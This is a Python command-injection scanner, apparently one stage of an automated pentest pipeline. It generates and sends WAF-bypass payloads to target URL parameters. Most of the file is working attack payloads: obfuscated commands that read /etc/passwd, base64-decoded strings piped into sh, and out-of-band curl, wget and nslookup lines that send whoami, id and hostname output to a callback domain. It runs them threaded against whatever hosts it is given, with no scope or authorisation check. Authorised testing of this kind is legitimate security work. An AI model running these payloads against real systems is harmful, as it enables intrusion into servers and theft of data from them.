#!/usr/bin/env python3
"""
Task 47: Advanced Command Injection Bypass + OOB Scanner
=========================================================
AI Brain for Jules Agent - catches CMDi that Task 46 missed.

Uses:
- Advanced bypass techniques (${IFS}, base64, wildcards, etc.)
- OOB callbacks via Interactsh for blind detection
- WAF-aware payload selection
"""

import os
import re
import json
import time
import hashlib
import argparse
import subprocess
import threading
import queue
import base64
import urllib.parse
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Set, Tuple, Optional
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[!] requests not installed - install with: pip install requests")


@dataclass
class BypassTarget:
    """Target for bypass testing"""
    url: str
    param: str
    original_value: str
    waf_type: Optional[str] = None
    os_type: str = "unix"
    source: str = "task47_targets"


@dataclass
class OOBHit:
    """Out-of-Band callback hit"""
    callback_id: str
    timestamp: str
    source_ip: str
    protocol: str  # dns, http
    raw_data: str
    target_url: Optional[str] = None
    target_param: Optional[str] = None


@dataclass
class BypassVulnerability:
    """Confirmed bypass vulnerability"""
    url: str
    param: str
    payload: str
    bypass_technique: str
    detection_method: str  # response, timing, oob
    evidence: str
    severity: str = "CRITICAL"


class BypassPayloadGenerator:
    """Generate bypass payloads based on WAF and filters"""
    
    # Space bypass techniques
    SPACE_BYPASS = [
        '${IFS}',
        '$IFS',
        '$IFS$9',
        '%09',      # Tab
        '%0a',      # Newline
        '<',        # Input redirection
        '$@',
        '{,}',      # Brace
    ]
    
    # Command separators
    SEPARATORS = [
        ';',
        '|',
        '||',
        '&&',
        '%0a',      # Newline
        '%0d%0a',   # CRLF
        '\n',
    ]
    
    # Backtick and subshell
    SUBSHELL = [
        '`{cmd}`',
        '$({cmd})',
        '$[{cmd}]',
    ]
    
    # Cat command bypass
    CAT_BYPASS = [
        'cat',
        "c'a't",
        'c"a"t',
        'c\\at',
        '/bin/cat',
        '/usr/bin/cat',
        'head',
        'tail',
        'more',
        'less',
        'nl',
        'sort',
        'uniq',
    ]
    
    # Path bypass for /etc/passwd
    PATH_BYPASS = [
        '/etc/passwd',
        '/e??/p?ss??',
        '/e*c/p*d',
        '/???/??ss??',
        '${HOME:0:1}etc${HOME:0:1}passwd',
        '${PATH%%:*}/../etc/passwd',
    ]
    
    # Base commands for detection
    BASE_COMMANDS = {
        'unix': {
            'quick': ['id', 'whoami', 'pwd'],
            'file': ['cat /etc/passwd', 'head -1 /etc/passwd'],
            'sleep': ['sleep 5', 'sleep 10'],
            'ping': ['ping -c 5 127.0.0.1'],
        },
        'windows': {
            'quick': ['whoami', 'hostname', 'echo %USERNAME%'],
            'file': ['type C:\\Windows\\win.ini'],
            'sleep': ['ping -n 6 127.0.0.1', 'timeout 5'],
        }
    }
    
    def __init__(self, waf_type: Optional[str] = None, os_type: str = 'unix'):
        self.waf_type = waf_type
        self.os_type = os_type
    
    def generate_bypass_payloads(self, oob_domain: Optional[str] = None) -> List[Tuple[str, str]]:
        """Generate all bypass payloads - returns (payload, technique) tuples"""
        payloads = []
        
        # 1. Space bypass payloads
        payloads.extend(self._generate_space_bypass())
        
        # 2. Quote/escape bypass
        payloads.extend(self._generate_quote_bypass())
        
        # 3. Encoding bypass (base64, hex)
        payloads.extend(self._generate_encoding_bypass())
        
        # 4. Wildcard bypass
        payloads.extend(self._generate_wildcard_bypass())
        
        # 5. Subshell variants
        payloads.extend(self._generate_subshell_bypass())
        
        # 6. Time-based blind
        payloads.extend(self._generate_timebased())
        
        # 7. OOB payloads (if domain provided)
        if oob_domain:
            payloads.extend(self._generate_oob_payloads(oob_domain))
        
        # 8. WAF-specific bypass
        if self.waf_type:
            payloads.extend(self._generate_waf_specific())
        
        return payloads
    
    def _generate_space_bypass(self) -> List[Tuple[str, str]]:
        """Space filtering bypass"""
        payloads = []
        base_cmds = self.BASE_COMMANDS[self.os_type]['quick']
        
        for cmd in base_cmds:
            for sep in [';', '|', '||', '&&']:
                # Basic with space bypass
                for space in ['${IFS}', '$IFS', '$IFS$9', '%09']:
                    if ' ' in cmd:
                        bypass_cmd = cmd.replace(' ', space)
                    else:
                        bypass_cmd = cmd
                    payloads.append((f'{sep}{bypass_cmd}', f'space_bypass_{space}'))
        
        # Brace expansion
        payloads.append((';{cat,/etc/passwd}', 'brace_expansion'))
        payloads.append((';{ls,-la,/}', 'brace_expansion'))
        payloads.append(('|{head,-1,/etc/passwd}', 'brace_expansion'))
        
        return payloads
    
    def _generate_quote_bypass(self) -> List[Tuple[str, str]]:
        """Quote and escape bypass"""
        payloads = []
        
        # Single quote insertion
        payloads.append((";c'a't${IFS}/etc/passwd", 'single_quote_insert'))
        payloads.append((";w'h'o'a'm'i", 'single_quote_insert'))
        
        # Double quote insertion
        payloads.append((';c"a"t${IFS}/etc/passwd', 'double_quote_insert'))
        payloads.append((';w"h"o"a"m"i', 'double_quote_insert'))
        
        # Backslash escape
        payloads.append((';c\\at${IFS}/etc/passwd', 'backslash_escape'))
        payloads.append((';wh\\oami', 'backslash_escape'))
        payloads.append((';/et\\c/pas\\swd', 'backslash_escape'))
        
        return payloads
    
    def _generate_encoding_bypass(self) -> List[Tuple[str, str]]:
        """Base64 and hex encoding bypass"""
        payloads = []
        
        # Base64 encoded commands
        id_b64 = base64.b64encode(b'id').decode()  # aWQ=
        cat_passwd_b64 = base64.b64encode(b'cat /etc/passwd').decode()
        
        payloads.append((f';echo${IFS}{id_b64}|base64${IFS}-d|sh', 'base64_encode'))
        payloads.append((f'|echo${IFS}{id_b64}|base64${IFS}-d|sh', 'base64_encode'))
        payloads.append((f';echo${IFS}{cat_passwd_b64}|base64${IFS}-d|sh', 'base64_encode'))
        
        # Hex encoding with $'...'
        # id = \x69\x64
        payloads.append((";$'\\x69\\x64'", 'hex_escape'))
        payloads.append((";$'\\x77\\x68\\x6f\\x61\\x6d\\x69'", 'hex_escape'))  # whoami
        
        # Printf encoding
        payloads.append((';$(printf${IFS}"\\x69\\x64")', 'printf_hex'))
        payloads.append((';`printf${IFS}"\\x69\\x64"`', 'printf_hex'))
        
        return payloads
    
    def _generate_wildcard_bypass(self) -> List[Tuple[str, str]]:
        """Wildcard character bypass"""
        payloads = []
        
        # ? wildcard for single char
        payloads.append((';/???/??t${IFS}/???/??ss??', 'wildcard_question'))
        payloads.append((';/b??/c?t${IFS}/e?c/p?ss??', 'wildcard_question'))
        
        # * wildcard for multiple chars
        payloads.append((';cat${IFS}/e*c/p*d', 'wildcard_star'))
        payloads.append((';/bi*/ca*${IFS}/et*/pas*', 'wildcard_star'))
        
        # Combined wildcards
        payloads.append((';/b?n/c*${IFS}/e?c/p*d', 'wildcard_combined'))
        
        return payloads
    
    def _generate_subshell_bypass(self) -> List[Tuple[str, str]]:
        """Backtick and subshell bypass"""
        payloads = []
        
        # Backticks
        payloads.append(('`id`', 'backtick'))
        payloads.append(('`whoami`', 'backtick'))
        payloads.append(('x`id`x', 'backtick_embedded'))
        
        # $() subshell
        payloads.append(('$(id)', 'subshell'))
        payloads.append(('$(whoami)', 'subshell'))
        payloads.append(('a$(id)a', 'subshell_embedded'))
        
        # Nested
        payloads.append(('$(echo${IFS}$(id))', 'nested_subshell'))
        
        return payloads
    
    def _generate_timebased(self) -> List[Tuple[str, str]]:
        """Time-based blind detection"""
        payloads = []
        
        if self.os_type == 'unix':
            # Sleep variants
            payloads.append((';sleep${IFS}5', 'sleep_ifs'))
            payloads.append(('|sleep${IFS}5', 'sleep_pipe'))
            payloads.append(('`sleep${IFS}5`', 'sleep_backtick'))
            payloads.append(('$(sleep${IFS}5)', 'sleep_subshell'))
            payloads.append(('||sleep${IFS}5', 'sleep_or'))
            payloads.append(('&&sleep${IFS}5', 'sleep_and'))
            
            # Ping (more reliable through WAFs)
            payloads.append((';ping${IFS}-c${IFS}5${IFS}127.0.0.1', 'ping_localhost'))
        else:
            # Windows
            payloads.append(('&ping -n 6 127.0.0.1', 'ping_windows'))
            payloads.append(('|timeout 5', 'timeout_windows'))
        
        return payloads
    
    def _generate_oob_payloads(self, oob_domain: str) -> List[Tuple[str, str]]:
        """Out-of-band callback payloads"""
        payloads = []
        
        # DNS-based (works through most firewalls)
        payloads.append((f';nslookup${IFS}{oob_domain}', 'oob_nslookup'))
        payloads.append((f';host${IFS}{oob_domain}', 'oob_host'))
        payloads.append((f';dig${IFS}{oob_domain}', 'oob_dig'))
        payloads.append((f'`nslookup${IFS}{oob_domain}`', 'oob_nslookup_bt'))
        payloads.append((f'$(nslookup${IFS}{oob_domain})', 'oob_nslookup_sub'))
        
        # DNS with data exfil
        payloads.append((f';nslookup${IFS}$(whoami).{oob_domain}', 'oob_dns_exfil'))
        payloads.append((f';host${IFS}$(id|cut${IFS}-d=${IFS}-f2).{oob_domain}', 'oob_dns_exfil_id'))
        
        # HTTP-based
        payloads.append((f';curl${IFS}http://{oob_domain}', 'oob_curl'))
        payloads.append((f';wget${IFS}http://{oob_domain}', 'oob_wget'))
        payloads.append((f'`curl${IFS}http://{oob_domain}`', 'oob_curl_bt'))
        payloads.append((f'$(curl${IFS}http://{oob_domain})', 'oob_curl_sub'))
        
        # HTTP with data
        payloads.append((f';curl${IFS}http://{oob_domain}/?u=$(whoami)', 'oob_curl_data'))
        payloads.append((f';wget${IFS}http://{oob_domain}/?h=$(hostname)', 'oob_wget_data'))
        
        # Space-heavy bypass + OOB
        payloads.append((f';{{curl,http://{oob_domain}}}', 'oob_curl_brace'))
        payloads.append((f';curl$IFS$9http://{oob_domain}', 'oob_curl_ifs9'))
        
        return payloads
    
    def _generate_waf_specific(self) -> List[Tuple[str, str]]:
        """WAF-specific bypass payloads"""
        payloads = []
        
        waf = self.waf_type.lower() if self.waf_type else ''
        
        if 'cloudflare' in waf:
            # Cloudflare-specific bypasses
            payloads.append((';%0aid', 'cloudflare_newline'))
            payloads.append(('%0a%0did', 'cloudflare_crlf'))
            payloads.append((';{id}', 'cloudflare_brace'))
            
        elif 'akamai' in waf:
            # Akamai case variation
            payloads.append((';WhOaMi', 'akamai_case'))
            payloads.append((';ID', 'akamai_upper'))
            
        elif 'modsecurity' in waf or 'mod_security' in waf:
            # ModSecurity bypass
            payloads.append((';i\\d', 'modsec_backslash'))
            payloads.append((';i""d', 'modsec_empty_quotes'))
            payloads.append(("/**/;id", 'modsec_comment'))
            
        elif 'imperva' in waf or 'incapsula' in waf:
            # Imperva/Incapsula
            payloads.append((';id%00', 'imperva_null'))
            payloads.append(('%00;id', 'imperva_null_prefix'))
        
        # Universal bypasses for unknown WAFs
        payloads.append((';{i]d}', 'universal_brace_typo'))
        payloads.append(('{{id}}', 'universal_double_brace'))
        
        return payloads


class InteractshClient:
    """Interactsh OOB callback client"""
    
    def __init__(self, server: Optional[str] = None):
        self.server = server
        self.domain = None
        self.process = None
        self.hits_queue = queue.Queue()
        self.running = False
        self._hit_map: Dict[str, Tuple[str, str]] = {}  # callback_id -> (url, param)
    
    def start(self) -> Optional[str]:
        """Start Interactsh client and return the domain"""
        if self.server:
            # Use provided server domain
            self.domain = self.server
            print(f"[*] Using provided OOB domain: {self.domain}")
            return self.domain
        
        # Try to start interactsh-client
        try:
            print("[*] Starting Interactsh client...")
            # Check if interactsh-client exists
            result = subprocess.run(
                ['interactsh-client', '-version'],
                capture_output=True,
                timeout=10
            )
            if result.returncode != 0:
                print("[!] Interactsh client not found - OOB testing disabled")
                return None
            
            # Start client in background
            self.process = subprocess.Popen(
                ['interactsh-client', '-json'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Parse domain from first line
            self.running = True
            self._start_listener_thread()
            
            # Wait for domain
            time.sleep(3)
            if self.domain:
                print(f"[*] Interactsh domain: {self.domain}")
                return self.domain
            else:
                print("[!] Failed to get Interactsh domain")
                self.stop()
                return None
                
        except FileNotFoundError:
            print("[!] interactsh-client not installed - install with: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")
            return None
        except Exception as e:
            print(f"[!] Failed to start Interactsh: {e}")
            return None
    
    def _start_listener_thread(self):
        """Start background thread to listen for callbacks"""
        def listener():
            while self.running and self.process:
                try:
                    line = self.process.stdout.readline()
                    if line:
                        self._process_line(line)
                except Exception:
                    break
        
        thread = threading.Thread(target=listener, daemon=True)
        thread.start()
    
    def _process_line(self, line: str):
        """Process a line from Interactsh output"""
        try:
            data = json.loads(line)
            
            # Check for domain info
            if 'server' in data and not self.domain:
                self.domain = data.get('domain', data.get('server'))
                return
            
            # Check for interaction
            if 'protocol' in data:
                hit = OOBHit(
                    callback_id=data.get('unique-id', ''),
                    timestamp=data.get('timestamp', datetime.now().isoformat()),
                    source_ip=data.get('remote-address', ''),
                    protocol=data.get('protocol', 'unknown'),
                    raw_data=line
                )
                
                # Map back to target
                if hit.callback_id in self._hit_map:
                    hit.target_url, hit.target_param = self._hit_map[hit.callback_id]
                
                self.hits_queue.put(hit)
                
        except json.JSONDecodeError:
            # Try to extract domain from plain text
            if '.oast.' in line or '.interact.' in line:
                match = re.search(r'([a-z0-9]+\.[a-z0-9]+\.(?:oast|interact)\.[a-z]+)', line)
                if match and not self.domain:
                    self.domain = match.group(1)
    
    def register_target(self, callback_id: str, url: str, param: str):
        """Register a callback ID with its target"""
        self._hit_map[callback_id] = (url, param)
    
    def generate_unique_id(self, url: str, param: str) -> str:
        """Generate unique callback ID for tracking"""
        data = f"{url}:{param}:{time.time()}"
        return hashlib.md5(data.encode()).hexdigest()[:8]
    
    def get_subdomain(self, callback_id: str) -> str:
        """Get subdomain with embedded callback ID"""
        if not self.domain:
            return ""
        return f"{callback_id}.{self.domain}"
    
    def get_hits(self, timeout: float = 0.1) -> List[OOBHit]:
        """Get any OOB hits (non-blocking)"""
        hits = []
        try:
            while True:
                hit = self.hits_queue.get(timeout=timeout)
                hits.append(hit)
        except queue.Empty:
            pass
        return hits
    
    def stop(self):
        """Stop Interactsh client"""
        self.running = False
        if self.process:
            self.process.terminate()
            self.process = None


class CMDiBypassScanner:
    """Advanced CMDi scanner with bypass and OOB"""
    
    def __init__(self, workspace: str, use_oob: bool = True, oob_server: Optional[str] = None):
        self.workspace = Path(workspace)
        self.outputs_dir = self.workspace / "outputs"
        self.cmdi_dir = self.outputs_dir / "cmdi"
        self.vuln_dir = self.outputs_dir / "vulnerabilities"
        
        # Create directories
        self.cmdi_dir.mkdir(parents=True, exist_ok=True)
        self.vuln_dir.mkdir(parents=True, exist_ok=True)
        
        # OOB setup
        self.use_oob = use_oob
        self.interactsh = InteractshClient(server=oob_server) if use_oob else None
        self.oob_domain = None
        
        # Results
        self.bypass_vulns: List[BypassVulnerability] = []
        self.oob_vulns: List[BypassVulnerability] = []
        
        # Checkpoint
        self.checkpoint_file = self.cmdi_dir / "bypass_checkpoint.json"
        self.scanned_urls: Set[str] = set()
        
        # Session
        self.session = requests.Session() if REQUESTS_AVAILABLE else None
        if self.session:
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
    
    def load_targets(self) -> List[BypassTarget]:
        """Load targets from Task 46 failures or fallback sources"""
        targets = []
        waf_info = self._load_waf_info()
        os_info = self._load_os_info()
        
        # Primary source: Task 46 failures
        task47_file = self.cmdi_dir / "task47_targets.txt"
        if task47_file.exists():
            print(f"[*] Loading targets from Task 46 failures...")
            with open(task47_file) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    # Format: url|param
                    parts = line.split('|')
                    if len(parts) >= 2:
                        url, param = parts[0], parts[1]
                        targets.append(BypassTarget(
                            url=url,
                            param=param,
                            original_value="test",
                            waf_type=waf_info.get(urllib.parse.urlparse(url).netloc),
                            os_type=os_info.get(urllib.parse.urlparse(url).netloc, 'unix'),
                            source='task46_failures'
                        ))
        
        # Also check commix_possible.txt
        possible_file = self.cmdi_dir / "commix_possible.txt"
        if possible_file.exists():
            print(f"[*] Loading possible targets from Commix...")
            with open(possible_file) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parts = line.split('|')
                    if len(parts) >= 2:
                        url, param = parts[0], parts[1]
                        if url not in [t.url for t in targets]:
                            targets.append(BypassTarget(
                                url=url,
                                param=param,
                                original_value="test",
                                waf_type=waf_info.get(urllib.parse.urlparse(url).netloc),
                                os_type=os_info.get(urllib.parse.urlparse(url).netloc, 'unix'),
                                source='commix_possible'
                            ))
        
        # Fallback if no Task 46 output
        if not targets:
            print("[*] No Task 46 failures found, loading from dynamic URLs...")
            targets = self._load_fallback_targets(waf_info, os_info)
        
        print(f"[*] Loaded {len(targets)} targets for bypass testing")
        return targets
    
    def _load_fallback_targets(self, waf_info: Dict, os_info: Dict) -> List[BypassTarget]:
        """Load from fallback sources if Task 46 not run"""
        targets = []
        
        fallback_files = [
            (self.outputs_dir / "queue_dynamic_endpoints_urls.txt", 'dynamic'),
            (self.outputs_dir / "arjun_found_params.txt", 'arjun'),
            (self.outputs_dir / "api_endpoints_live.txt", 'api'),
        ]
        
        for filepath, source in fallback_files:
            if filepath.exists():
                with open(filepath) as f:
                    for line in f:
                        url = line.strip()
                        if url and '?' in url:
                            parsed = urllib.parse.urlparse(url)
                            params = urllib.parse.parse_qs(parsed.query)
                            for param in params:
                                targets.append(BypassTarget(
                                    url=url,
                                    param=param,
                                    original_value=params[param][0] if params[param] else 'test',
                                    waf_type=waf_info.get(parsed.netloc),
                                    os_type=os_info.get(parsed.netloc, 'unix'),
                                    source=source
                                ))
        
        return targets
    
    def _load_waf_info(self) -> Dict[str, str]:
        """Load WAF info from Task 32"""
        waf_info = {}
        waf_file = self.outputs_dir / "waf" / "waf_results.json"
        
        if waf_file.exists():
            try:
                with open(waf_file) as f:
                    data = json.load(f)
                    if isinstance(data, dict):
                        for host, info in data.items():
                            if isinstance(info, dict) and info.get('waf_detected'):
                                waf_info[host] = info.get('waf_name', 'unknown')
            except Exception as e:
                print(f"[!] Error loading WAF info: {e}")
        
        return waf_info
    
    def _load_os_info(self) -> Dict[str, str]:
        """Load OS info from Task 35 tech detection"""
        os_info = {}
        tech_file = self.outputs_dir / "nuclei" / "brain_knowledge.json"
        
        if tech_file.exists():
            try:
                with open(tech_file) as f:
                    data = json.load(f)
                    for host, info in data.items():
                        if isinstance(info, dict):
                            tech_stack = info.get('technologies', [])
                            if any(t.lower() in ['windows', 'iis', 'asp.net', 'aspx'] for t in tech_stack):
                                os_info[host] = 'windows'
                            else:
                                os_info[host] = 'unix'
            except Exception as e:
                print(f"[!] Error loading OS info: {e}")
        
        return os_info
    
    def scan_all(self, targets: List[BypassTarget], threads: int = 5):
        """Scan all targets with bypass payloads"""
        if not REQUESTS_AVAILABLE:
            print("[!] requests library not available")
            return
        
        # Load checkpoint
        self._load_checkpoint()
        
        # Start OOB listener
        if self.use_oob and self.interactsh:
            self.oob_domain = self.interactsh.start()
            if not self.oob_domain:
                print("[!] OOB disabled - continuing with response/timing detection only")
                self.use_oob = False
        
        # Filter already scanned
        targets = [t for t in targets if f"{t.url}:{t.param}" not in self.scanned_urls]
        print(f"[*] Scanning {len(targets)} targets (skipping {len(self.scanned_urls)} already scanned)")
        
        # Scan with threading
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self._scan_target, target): target for target in targets}
            
            for future in as_completed(futures):
                target = futures[future]
                try:
                    future.result()
                    self.scanned_urls.add(f"{target.url}:{target.param}")
                    self._save_checkpoint()
                except Exception as e:
                    print(f"[!] Error scanning {target.url}: {e}")
        
        # Final OOB check (wait for delayed callbacks)
        if self.use_oob:
            print("[*] Waiting for delayed OOB callbacks...")
            time.sleep(10)
            self._check_oob_hits()
        
        # Save results
        self._save_results()
        
        # Stop OOB listener
        if self.interactsh:
            self.interactsh.stop()
    
    def _scan_target(self, target: BypassTarget):
        """Scan single target with all bypass techniques"""
        print(f"[*] Testing {target.url} - param: {target.param}")
        
        # Generate payloads
        generator = BypassPayloadGenerator(
            waf_type=target.waf_type,
            os_type=target.os_type
        )
        
        oob_subdomain = None
        if self.use_oob and self.oob_domain and self.interactsh:
            callback_id = self.interactsh.generate_unique_id(target.url, target.param)
            oob_subdomain = self.interactsh.get_subdomain(callback_id)
            self.interactsh.register_target(callback_id, target.url, target.param)
        
        payloads = generator.generate_bypass_payloads(oob_domain=oob_subdomain)
        
        # Get baseline response
        baseline = self._get_baseline(target)
        if not baseline:
            return
        
        # Test each payload
        for payload, technique in payloads:
            vuln = self._test_payload(target, payload, technique, baseline)
            if vuln:
                if vuln.detection_method == 'oob':
                    self.oob_vulns.append(vuln)
                else:
                    self.bypass_vulns.append(vuln)
                print(f"[+] VULNERABLE: {target.url} - {technique}")
                self._write_vuln_report(vuln)
                break  # Stop on first confirmed vuln
            
            # Brief delay between requests
            time.sleep(0.1)
        
        # Check for OOB hits
        if self.use_oob:
            self._check_oob_hits()
    
    def _get_baseline(self, target: BypassTarget) -> Optional[Dict]:
        """Get baseline response for comparison"""
        try:
            parsed = urllib.parse.urlparse(target.url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            
            # Send baseline request
            clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            resp = self.session.get(clean_url, params=params, timeout=10)
            
            return {
                'status': resp.status_code,
                'length': len(resp.content),
                'time': resp.elapsed.total_seconds(),
                'content': resp.text[:500]
            }
        except Exception as e:
            print(f"[!] Baseline error for {target.url}: {e}")
            return None
    
    def _test_payload(self, target: BypassTarget, payload: str, technique: str, baseline: Dict) -> Optional[BypassVulnerability]:
        """Test a single payload"""
        try:
            parsed = urllib.parse.urlparse(target.url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            
            # Inject payload
            original_value = params.get(target.param, '')
            params[target.param] = original_value + payload
            
            clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            start = time.time()
            resp = self.session.get(clean_url, params=params, timeout=30)
            elapsed = time.time() - start
            
            # Check for vulnerability
            detection = self._analyze_response(resp, elapsed, baseline, payload)
            
            if detection:
                return BypassVulnerability(
                    url=target.url,
                    param=target.param,
                    payload=payload,
                    bypass_technique=technique,
                    detection_method=detection['method'],
                    evidence=detection['evidence']
                )
            
        except requests.Timeout:
            # Timeout could indicate time-based blind
            if 'sleep' in payload or 'ping' in payload:
                return BypassVulnerability(
                    url=target.url,
                    param=target.param,
                    payload=payload,
                    bypass_technique=technique,
                    detection_method='timing',
                    evidence='Request timed out (30s) - likely time-based blind CMDi'
                )
        except Exception as e:
            pass
        
        return None
    
    def _analyze_response(self, resp, elapsed: float, baseline: Dict, payload: str) -> Optional[Dict]:
        """Analyze response for CMDi indicators"""
        
        # 1. Check for command output in response
        cmdi_indicators = [
            r'uid=\d+',                      # id output
            r'root:x:0:0',                   # /etc/passwd
            r'www-data',                     # common user
            r'nobody',                       # common user
            r'[a-z]+:\$[0-9a-f\$]+:',       # shadow-like
            r'COMPUTERNAME=',                # Windows
            r'USERDOMAIN=',                  # Windows
            r'\\Windows\\system32',          # Windows path
            r'Directory of [A-Z]:\\',        # dir output
        ]
        
        for pattern in cmdi_indicators:
            if re.search(pattern, resp.text, re.IGNORECASE):
                return {
                    'method': 'response',
                    'evidence': f"Command output detected: {pattern}"
                }
        
        # 2. Time-based detection
        if 'sleep' in payload or 'ping' in payload:
            # Sleep 5 should add ~5 seconds
            expected_delay = 5.0
            if elapsed >= (baseline['time'] + expected_delay - 1):
                return {
                    'method': 'timing',
                    'evidence': f"Response delayed by {elapsed - baseline['time']:.2f}s (expected {expected_delay}s)"
                }
        
        # 3. Error-based (might reveal command execution)
        error_patterns = [
            r'sh: .*: not found',
            r'bash: .*: command not found',
            r'/bin/sh:',
            r'syntax error',
            r'unexpected token',
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, resp.text, re.IGNORECASE):
                return {
                    'method': 'error',
                    'evidence': f"Shell error detected: {pattern}"
                }
        
        return None
    
    def _check_oob_hits(self):
        """Check for OOB callback hits"""
        if not self.interactsh:
            return
        
        hits = self.interactsh.get_hits()
        for hit in hits:
            print(f"[+] OOB CALLBACK: {hit.protocol} from {hit.source_ip}")
            
            if hit.target_url and hit.target_param:
                vuln = BypassVulnerability(
                    url=hit.target_url,
                    param=hit.target_param,
                    payload=f"OOB callback to {hit.callback_id}",
                    bypass_technique='oob_callback',
                    detection_method='oob',
                    evidence=f"Received {hit.protocol} callback at {hit.timestamp}"
                )
                
                if vuln not in self.oob_vulns:
                    self.oob_vulns.append(vuln)
                    self._write_vuln_report(vuln)
    
    def _write_vuln_report(self, vuln: BypassVulnerability):
        """Write vulnerability report"""
        vuln_hash = hashlib.md5(f"{vuln.url}:{vuln.param}".encode()).hexdigest()[:8]
        
        if vuln.detection_method == 'oob':
            filename = f"CMDI-BLIND-{vuln_hash}-CRITICAL.md"
        else:
            filename = f"CMDI-BYPASS-{vuln_hash}-CRITICAL.md"
        
        report = f"""# Command Injection: {filename.replace('.md', '')}

## Summary
| Field | Value |
|-------|-------|
| **Vulnerability ID** | {filename.replace('.md', '')} |
| **URL** | `{vuln.url}` |
| **Parameter** | `{vuln.param}` |
| **Bypass Technique** | {vuln.bypass_technique} |
| **Detection Method** | {vuln.detection_method} |
| **Severity** | CRITICAL |

## Evidence
```
{vuln.evidence}
```

## Payload Used
```
{vuln.payload}
```

## Impact
- **Severity**: CRITICAL
- Full command execution on the server
- Potential for complete system compromise
- Data exfiltration, lateral movement, persistence

## Reproduction Steps
1. Navigate to URL: `{vuln.url}`
2. Inject payload in parameter `{vuln.param}`:
   ```
   {vuln.payload}
   ```
3. Observe {'OOB callback' if vuln.detection_method == 'oob' else 'response/timing change'}

## Remediation
1. **Input Validation**: Strict whitelist validation on all user input
2. **Avoid Shell Commands**: Use language-native functions instead of shell execution
3. **Parameterized APIs**: Use APIs that don't invoke shell interpreters
4. **Least Privilege**: Run application with minimal permissions
5. **WAF Rules**: Block command injection patterns (but don't rely on this alone)

## References
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---
*Generated by Task 47 - Advanced CMDi Bypass Scanner*
*Timestamp: {datetime.now().isoformat()}*
"""
        
        filepath = self.vuln_dir / filename
        with open(filepath, 'w') as f:
            f.write(report)
        print(f"[+] Report written: {filepath}")
    
    def _save_results(self):
        """Save scan results"""
        # bypass_vulnerable.txt
        bypass_file = self.cmdi_dir / "bypass_vulnerable.txt"
        with open(bypass_file, 'w') as f:
            f.write("# CMDi Bypass Vulnerabilities\n")
            f.write(f"# Generated: {datetime.now().isoformat()}\n\n")
            for vuln in self.bypass_vulns:
                f.write(f"{vuln.url}|{vuln.param}|{vuln.bypass_technique}\n")
        
        # oob_vulnerable.txt
        oob_file = self.cmdi_dir / "oob_vulnerable.txt"
        with open(oob_file, 'w') as f:
            f.write("# CMDi OOB (Blind) Vulnerabilities\n")
            f.write(f"# Generated: {datetime.now().isoformat()}\n\n")
            for vuln in self.oob_vulns:
                f.write(f"{vuln.url}|{vuln.param}|{vuln.bypass_technique}\n")
        
        # Full JSON results
        results_file = self.cmdi_dir / "bypass_results.json"
        results = {
            'scan_time': datetime.now().isoformat(),
            'bypass_vulns': [
                {
                    'url': v.url,
                    'param': v.param,
                    'payload': v.payload,
                    'technique': v.bypass_technique,
                    'detection': v.detection_method,
                    'evidence': v.evidence
                }
                for v in self.bypass_vulns
            ],
            'oob_vulns': [
                {
                    'url': v.url,
                    'param': v.param,
                    'payload': v.payload,
                    'technique': v.bypass_technique,
                    'detection': v.detection_method,
                    'evidence': v.evidence
                }
                for v in self.oob_vulns
            ]
        }
        
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        # Summary
        print(f"\n{'='*60}")
        print("TASK 47 - BYPASS SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"Bypass vulnerabilities: {len(self.bypass_vulns)}")
        print(f"OOB/Blind vulnerabilities: {len(self.oob_vulns)}")
        print(f"Total confirmed: {len(self.bypass_vulns) + len(self.oob_vulns)}")
        print(f"\nResults: {self.cmdi_dir}")
    
    def _load_checkpoint(self):
        """Load checkpoint"""
        if self.checkpoint_file.exists():
            try:
                with open(self.checkpoint_file) as f:
                    data = json.load(f)
                    self.scanned_urls = set(data.get('scanned', []))
            except Exception:
                pass
    
    def _save_checkpoint(self):
        """Save checkpoint"""
        data = {'scanned': list(self.scanned_urls)}
        with open(self.checkpoint_file, 'w') as f:
            json.dump(data, f)


def main():
    parser = argparse.ArgumentParser(description='Task 47: Advanced CMDi Bypass + OOB Scanner')
    parser.add_argument('--workspace', '-w', required=True, help='Workspace path')
    parser.add_argument('--no-oob', action='store_true', help='Disable OOB testing')
    parser.add_argument('--oob-server', help='Custom OOB server domain')
    parser.add_argument('--url', help='Test specific URL')
    parser.add_argument('--threads', '-t', type=int, default=5, help='Number of threads')
    parser.add_argument('--resume', action='store_true', help='Resume from checkpoint')
    
    args = parser.parse_args()
    
    scanner = CMDiBypassScanner(
        workspace=args.workspace,
        use_oob=not args.no_oob,
        oob_server=args.oob_server
    )
    
    if args.url:
        # Test specific URL
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(args.url)
        params = parse_qs(parsed.query)
        targets = [
            BypassTarget(
                url=args.url,
                param=param,
                original_value=params[param][0] if params[param] else 'test'
            )
            for param in params
        ]
    else:
        targets = scanner.load_targets()
    
    if not args.resume:
        # Clear checkpoint for fresh scan
        if scanner.checkpoint_file.exists():
            scanner.checkpoint_file.unlink()
    
    scanner.scan_all(targets, threads=args.threads)


if __name__ == '__main__':
    main()
